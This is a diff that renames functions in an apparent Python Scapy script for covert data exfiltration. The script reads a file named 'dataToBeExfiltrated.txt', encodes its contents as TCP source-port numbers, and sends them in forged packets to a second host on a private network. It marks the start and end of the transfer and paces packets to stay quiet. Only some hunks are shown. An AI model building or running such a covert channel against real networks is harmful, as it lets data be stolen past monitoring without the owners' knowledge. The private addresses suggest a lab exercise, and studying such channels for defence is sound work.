@@ -5,7 +5,7 @@ import codecs
 import sys
 import time
 
-def fileToDecimal(filename):
+def file_to_decimal(filename):
     fname = filename
     #open file
     try:
@@ -49,7 +49,7 @@ def fileToDecimal(filename):
     #print("List of decimal: \n {}".format(finished_decimal_list))  
     return finished_decimal_list
 
-def sendpacket(source_IP, dst_IP, src_port, dst_port=5433):
+def send_packet(source_IP, dst_IP, src_port, dst_port=5433):
     packet = IP()/TCP(dport=dst_port, sport=src_port)
     packet.src = source_IP
     packet.dst = dst_IP
@@ -58,31 +58,31 @@ def sendpacket(source_IP, dst_IP, src_port, dst_port=5433):
 
 def main():
     #creates the list of source ports to send
-    list_of_decimal = fileToDecimal('dataToBeExfiltrated.txt')
+    list_of_decimal = file_to_decimal('dataToBeExfiltrated.txt')
     sourceIP = "192.168.30.128"
     destinationIP = "192.168.30.129"
     #seconds between 3 packets
     packet_timeout = 1
 
     #initial packet sent with port 32768 to signal the start of the data transfer
-    sendpacket(sourceIP, destinationIP, 32768)
+    send_packet(sourceIP, destinationIP, 32768)
 
     #second packet sent with port set to the amount of packets being sent
     length_of_decimal = int(len(list_of_decimal))
-    sendpacket(sourceIP, destinationIP, length_of_decimal)
+    send_packet(sourceIP, destinationIP, length_of_decimal)
     
     #loop through and send packets, pause every 3rd packet
     packet_counter = 2
     for i in list_of_decimal:
         #create and send the packets one by one
-        sendpacket(sourceIP, destinationIP, int(i))
+        send_packet(sourceIP, destinationIP, int(i))
         packet_counter += 1
         if packet_counter == 3:
             time.sleep(packet_timeout)
             packet_counter = 0
 
     #Last packet sent with port 32768 to signal the end of the data transfer
-    sendpacket(sourceIP, destinationIP, 32768)
+    send_packet(sourceIP, destinationIP, 32768)
 
     print("All packets have been sent.")
 
